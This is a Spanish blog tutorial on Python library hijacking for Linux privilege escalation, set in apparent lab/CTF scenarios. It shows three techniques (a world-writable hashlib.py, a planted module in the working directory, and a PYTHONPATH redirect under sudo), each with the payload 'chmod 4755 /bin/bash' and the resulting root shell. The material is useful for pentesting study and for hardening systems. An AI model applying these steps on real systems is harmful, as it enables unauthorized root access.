---
title: "Python Library Hijacking en GNU/Linux"
date: "2021-06-14"
categories: [Hacking]
tags: [CTFs, Hacking, Pentesting, Python, Red-Team, Hijacking]
media_subpath: /assets/img/posts/2021-06-14-python-library-hijacking-linux
image:
   path: header/python_hijacking.webp
   lqip: data:image/webp;base64,UklGRkgAAABXRUJQVlA4IDwAAABQAwCdASoUAAwAPzmEuVOvKKWisAgB4CcJaQAAW+qyS5k4AAD+zF1s7EBHLdRwvLPXyesbG17BZygAAAA=
   
published: true
---

En este artículo voy a mostrar 3 escenarios en los que se ha intentado replicar casuísticas en las cuales podríamos realizar la técnica de secuestro de librerías/módulos de python en un entorno GNU/Linux. Esta técnica tiene el nombre de **Python Library Hijacking**.

## ¿Que es Python Library Hijacking?

Python Library Hijacking, en español secuestro de biblioteca de python, es la técnica de explotación utilizada para manipular o suplantar una biblioteca o módulo como puede ser: **_os.py_**, **_requests.py_**, **_hashlib.py_**, **_etc,_** de forma que el atacante tenga la posibilidad de ejecutar comandos en el sistema a través de un script que realiza la importación de estos.

Esta técnica de explotación no se debe a una vulnerabilidad como tal, si no más bien se definiría como una incorrecta configuración de seguridad aplicada a nivel de sistema.

## ¿Para qué se utiliza?

El uso de esta técnica de explotación nos permite realizar de manera efectiva la fase de escalada de privilegios en un ejercicio de pentesting, con ella podemos llegar a obtener escalada de privilegios horizontal o vertical, dependiendo de los permisos tengamos asignados al usuario o binarios que intentemos explotar.

![Esquema para escalada de privilegios horizontal y vertical.](body/20eb1f34da9f2d97a076d796013282a3641db81a.png)

Nuestra intención como atacantes ante una escalada de privilegios, será la de obtener un usuario con mayores privilegios a nivel de sistema del que actualmente poseemos, de nada nos servirá obtener un usuario que tenga menos privilegios que el actual.

## ¿Cómo se realiza?

Los escenarios que se van a mostrar a continuación, intentan replicar casuísticas en las cuales podríamos abusar de una incorrecta configuración de seguridad y aprovecharnos de esta técnica mencionada.

Para ponernos en contexto, imaginemos que hemos obtenido shell de usuario no privilegiado (**pepito**) en un entorno **GNU/Linux** y tenemos en nuestro directorio un script desarrollado en Python, este script realiza una comprobación entre hash y password y devuelve True o False si es correcta, algo sencillo para estos ejemplos.

### Escenario 1 - Permisos de escritura en módulo importado

En este escenario, nos basaremos en configuraciones incorrectas a nivel de sistema en cuanto a permisos en los archivos de módulos. En el caso de que los permisos sean predeterminados, no habrá ningún problema, el problema viene cuando al módulo se le han asignado permisos de escritura para entornos de desarrollo, en este caso tendremos un vector claro para escalada de privilegios.

Obtenemos shell con usuario **pepito** y observamos que tenemos un script desarrollado en python en el directorio **home** con los permisos de lectura y ejecución para **Otros**:

```bash
pepito@parrot:~$ ls -l
total 4
-rwxr-xr-x 1 root root 468 jun  9 14:21 checkpassword.py
```

Si enumeramos los permisos de **SUDO**, vemos que tenemos permisos para ejecutar **python3** junto a un script con privilegios **root**:

```bash
pepito@parrot:~$ sudo -l
Matching Defaults entries for pepito on parrot:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin

User pepito may run the following commands on parrot:
    (ALL) NOPASSWD: /usr/bin/python3 /home/pepito/checkpassword.py *
```

Como tenemos permisos de lectura para el script, lo visualizamos y vemos que módulos está importando. En este caso está importando 2 módulos: **sys** y **hashlib**.

```bash
pepito@parrot:~$ cat checkpassword.py 
#!/usr/bin/env python3

import sys
import hashlib

# Variables Globales
provided_hash = 'b0d107a1cb94cd60c513a8636f99b8d700154887e2a96f0310a1b5f3e60a6ddd'

def checkpassword(password, provided_hash):
	hash = hashlib.sha256(password.encode()).hexdigest()

	return provided_hash == hash

if __name__ == '__main__':

	if len(sys.argv) != 2:
		print("\\n[!] Uso: {0} + Password".format(sys.argv[0]))
		sys.exit(1)

	else:
		print(checkpassword(sys.argv[1], provided_hash))
```

Listamos los permisos de estos 2 módulos:

```bash
pepito@parrot:~$ find / -type f -name "hashlib.py" -o -name "sys.py" 2>/dev/null | xargs ls -l
-rw-rw-rw- 1 root    root    10043 jun 11 11:32 /usr/lib/python3.9/hashlib.py
-rw-r--r-- 1 root    root      132 oct 31  2019 /usr/lib/python3/dist-packages/future/moves/sys.py
```

Como vemos, tenemos permisos de escritura en el módulo **_hashlib.py_**, para este caso inyectaremos código en el módulo para así poder escalar privilegios junto con los permisos de **SUDO**:

```bash
pepito@parrot:~$ echo -e 'import os\\nos.system("chmod 4755 /bin/bash")' >> /usr/lib/python3.9/hashlib.py
```

Si ejecutamos el script con **SUDO**, este ejecutará la instrucción que hemos añadido al módulo de **_hashlib.py_** y se ejecutará en contexto del usuario **root**:

```bash
pepito@parrot:~$ sudo /usr/bin/python3 /home/pepito/checkpassword.py 1234
False
pepito@parrot:~$ bash -p
bash-5.1# whoami
root
```

### Escenario 2 - Orden de prioridad en PATH de Python

En este escenario, nos basaremos en el orden de prioridad del PATH de la biblioteca de Python que se aplica al archivo de módulo que está importando nuestro script, como en el caso anterior **SYS** y **HASHLIB**.

Cuando importamos un módulo en un script de Python, este se buscará dentro de los directorios predeterminados con un orden de prioridad, este orden predeterminado es: **IZQUIERDA → DERECHA**

El módulo que se está buscando se ubicará en una de las rutas predeterminadas definidas por Python. En el caso de que exista un módulo en el mismo directorio que el script original, esta tendrá prioridad sobre las rutas predeterminadas.

Como podemos ver en la siguiente imagen, el primer directorio donde buscará el módulo será el directorio de trabajo actual:

[![](body/e603c405eb539826656bf3a2349e735810ff6c2d.png)](https://bypasseados.com/wp-content/uploads/2021/06/e603c405eb539826656bf3a2349e735810ff6c2d.png)

Seguimos con el mismo contexto que en el anterior escenario, pero sin los permisos de escritura en el módulo hashlib.py.

Para explotar este escenario, creamos un archivo python con el nombre del módulo que esté importando y lo ubicaremos en el directorio de trabajo actual, junto con el script original y añadimos nuestro código para la escalada de privilegios:

```bash
pepito@parrot:~$ touch hashlib.py

pepito@parrot:~$ chmod +x hashlib.py

pepito@parrot:~$ ls -l
total 8
-rwsr-xr-x 1 root   root   468 jun  9 14:21 checkpassword.py
-rwxr-xr-x 1 pepito pepito  44 jun 14 10:52 hashlib.py

pepito@parrot:~$ cat hashlib.py 
import os
os.system("chmod 4755 /bin/bash")
```

Seguimos manteniendo el privilegio de **SUDO** asignado:

```bash
pepito@parrot:~$ sudo -l
Matching Defaults entries for pepito on parrot:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin

User pepito may run the following commands on parrot:
    (ALL) NOPASSWD: /usr/bin/python3 /home/pepito/checkpassword.py *
```

Ejecutamos el script de Python con **SUDO**, nos mostrará error ya que nuestro módulo no tiene funciones definidas, pero aún así ejecutará el código añadido:

```bash
pepito@parrot:~$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1234376 feb 24 21:53 /bin/bash

pepito@parrot:~$ sudo /usr/bin/python3 /home/pepito/checkpassword.py 1234
Traceback (most recent call last):
  File "/home/pepito/checkpassword.py", line 21, in <module>
    print(checkpassword(sys.argv[1], provided_hash))
  File "/home/pepito/checkpassword.py", line 10, in checkpassword
    hash = hashlib.sha256(password.encode()).hexdigest()
AttributeError: module 'hashlib' has no attribute 'sha256'

pepito@parrot:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1234376 feb 24 21:53 /bin/bash
```

Podemos ver como antes de la ejecución, el binario **/bin/bash** no tiene permiso **SUID** asginado.

Al finalizar la ejecución se ha interpretado el código que hemos añadido al binario **_hashlib.py_** y acto seguido el binario **/bin/bash** ya tiene asginado el permiso **SUID**, permitiéndonos obtener shell como **root:**

```bash
pepito@parrot:~$ bash -p 
bash-5.1# whoami
root
```

### Escenario 3 - Redirección con variable de entorno PYTHONPATH

En este escenario, vamos explotar el uso de la variable de entorno **PYTHONPATH**. Esta variable contiene una lista de directorios donde Python buscará los diferentes módulos importados en el script. Si un atacante puede cambiar o modificar esta variable, entonces puede usarla para realizar la escalada de privilegios en la máquina donde se encuentre.

Para este escenario, se han modificado los permisos de **SUDO** para poder setear la variable **PYTHONPATH** en la ejecución del script:

```bash
pepito@parrot:~$ sudo -l
Matching Defaults entries for pepito on parrot:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin

User pepito may run the following commands on parrot:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /home/pepito/checkpassword.py *
```

Como en el caso anterior, creamos un módulo de python similar al que se esté importando (**hashlib.py**). En este caso como podemos elegir el origen del módulo, lo vamos a crear en el directorio **/tmp:**

```bash
pepito@parrot:/tmp$ cd $(mktemp -d)

pepito@parrot:/tmp/tmp.cus7yq315l$ touch hashlib.py && chmod +x hashlib.py

pepito@parrot:/tmp/tmp.cus7yq315l$ ls -l
total 4
-rwxr-xr-x 1 pepito pepito 44 jun 14 14:43 hashlib.py

pepito@parrot:/tmp/tmp.cus7yq315l$ cat hashlib.py 
import os
os.system("chmod 4755 /bin/bash")
```

Verificamos que antes de la ejecución del script no tenemos asignado el permido **SUID** al binario **/bin/bash**:

```bash
pepito@parrot:/tmp/tmp.cus7yq315l$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1234376 feb 24 21:53 /bin/bash
```

Ejecutamos el script con los permisos de **SUDO** y la seteando la variable **PYTHONPATH** con el directorio donde hemos ubicado el archivo del módulo **_hashlib.py_** de python que hemos creado:

```bash

pepito@parrot:/tmp/tmp.cus7yq315l$ sudo PYTHONPATH=$(pwd) /usr/bin/python3 /home/pepito/checkpassword.py 1234
Traceback (most recent call last):
  File "/home/pepito/checkpassword.py", line 21, in <module>
    print(checkpassword(sys.argv[1], provided_hash))
  File "/home/pepito/checkpassword.py", line 10, in checkpassword
    hash = hashlib.sha256(password.encode()).hexdigest()
AttributeError: module 'hashlib' has no attribute 'sha256'

pepito@parrot:/tmp/tmp.cus7yq315l$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1234376 feb 24 21:53 /bin/bash
```

Como vemos, el código que hemos definido en el módulo creado, ha sido ejecutado y tenemos permisos **SUID** en el binario **/bin/bash**, solo nos queda lanzar la shell de bash en contexto de usuario privilegiado **root**:

```bash
pepito@parrot:/tmp/tmp.cus7yq315l$ bash -p
bash-5.1# whoami
root
```

## Conclusión

Como hemos podido ver con estos escenarios en los cuales podemos hacer uso de **Python Library Hijacking** para obtener escalada de privilegios a través de configuraciones incorrectas en el sistema y explotando módulos o variable de entorno de python puede ser posible. En este caso el código inyectado en los módulos ha sido para mantener persistencia añadiendo permisos SUID al binario de /bin/bash.

Como punto a comentar, puede darse el caso que los scripts se estén ejecutando a intervalos regulares de tiempo con privilegios de usuario **root**, como puede ser con **CRON**. En tal caso, las técnicas realizadas en los escenarios mostrados son exactamente igual.

Estos escenarios pueden darse en la vida real cuando se tratan de entornos de desarrollo específicos, porque en estos se suele dar como prioridad la facilidad para llevar a cabo tareas que requieran la modificación de bibliotecas para el correcto funcionamiento del programa que se esté desarrollando en el momento.

Espero que sirva de ayuda si estáis realizando un ejercicio de pentesting o realizando laboratorios en plataformas **CTF** ya que se suele dar el caso en bastantes ocasiones.

Gracias,

Saludos!
